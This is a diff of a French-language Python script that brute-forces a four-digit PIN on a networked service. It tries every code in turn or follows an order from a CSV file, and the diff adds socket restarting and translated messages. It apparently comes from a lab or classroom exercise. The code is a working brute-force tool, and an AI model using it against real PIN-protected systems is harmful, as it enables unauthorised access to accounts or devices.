@@ -1,6 +1,5 @@
-import sys, socket, csv
+import sys, socket, csv, time
 from simple_term_menu import TerminalMenu
-import time
 
 def await_input() -> None:
     """
@@ -11,7 +10,7 @@ def await_input() -> None:
     input("Appuyez sur Entrée pour continuer...")
 
 
-def find_pin_without_optimisation(ma_socket: socket.socket):
+def find_pin_without_optimisation(ma_socket: socket.socket) -> None:
     """
     Fonction permettant de se connecter au site internet en testant tout les codes pin possibles
     :param ma_socket: Socket utilisateur permettant de se connecter au site internet
@@ -23,7 +22,6 @@ def find_pin_without_optimisation(ma_socket: socket.socket):
     print('Recherche du code pin...')
 
     for pin in range(1000):
-        print(pin)
         ma_socket.sendall(bytes(str(pin).zfill(4), 'utf-8'))
         ligne = str(ma_socket.recv(1024))
         if not ligne == "b'Incorrect PIN\\n'":
@@ -33,7 +31,6 @@ def find_pin_without_optimisation(ma_socket: socket.socket):
 
     if not pin_found:
         for pin in range(1000, 10000):
-            print(pin)
             ma_socket.sendall(bytes(str(pin), 'utf-8'))
             ligne = str(ma_socket.recv(1024))
             if not ligne == "b'Incorrect PIN\\n'":
@@ -42,14 +39,13 @@ def find_pin_without_optimisation(ma_socket: socket.socket):
                 break
 
     if not pin_found:
-        print("PIN NOT FOUND (how ???)")
+        print("Code PIN introuvable")
     else:
-        print(f"PIN FOUND : {pin_use}")
+        print(f"Code PIN trouvé : {pin_use}")
         timer_end = time.time()
         print(f"Temps d'exécution : {round(timer_end - timer_start, 2)} secondes")
 
-
-def find_pin_with_a_sort(ma_socket: socket.socket):
+def find_pin_with_a_sort(ma_socket: socket.socket) -> None:
     """
     Fonction permettant de se connecter au site internet en testant tout les codes pin possibles dans un ordre précis
     grâce à un fichier csv
@@ -72,12 +68,31 @@ def find_pin_with_a_sort(ma_socket: socket.socket):
                 break
 
         if not pin_found:
-            print("PIN NOT FOUND (how ???)")
+            print("Code PIN introuvable")
         else:
-            print(f"PIN FOUND : {pin_use}")
+            print(f"Code PIN trouvé : {pin_use}")
             timer_end = time.time()
             print(f"Temps d'exécution : {round(timer_end - timer_start, 2)} secondes")
 
+def restart_socket(ma_socket:socket.socket, server: str, port: int) -> socket.socket:
+    """
+    Fonction permettant de renouveller la socket. Si nous voulons tester les deux méthodes sans quitter le programme il
+    faut nécessairement passer par cette méthode.
+    :param ma_socket: Socket utilisateur permettant de se connecter au site internet
+    :return:
+    """
+    ma_socket.close()
+    ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        ma_socket.connect((server, port))
+    except Exception as e:
+        print("Problème de connexion", e.args)
+        sys.exit(1)
+
+    ma_socket.recv(1024)
+
+    return ma_socket
 
 
 if __name__ == "__main__":
@@ -96,16 +111,18 @@ if __name__ == "__main__":
         print("Problème de connexion", e.args)
         sys.exit(1)
 
-    ligne = ma_socket.recv(1024)
-    print(ligne)
+    ma_socket.recv(1024)
+
 
     while True:
         main_entry_index = main_menu.show()
         if main_entry_index == 0:
             find_pin_without_optimisation(ma_socket)
+            ma_socket = restart_socket(ma_socket, server, port)
             await_input()
         elif main_entry_index == 1:
             find_pin_with_a_sort(ma_socket)
+            ma_socket = restart_socket(ma_socket, server, port)
             await_input()
         elif main_entry_index == len(main_options) - 1 or main_entry_index is None:
             print("Au revoir !")
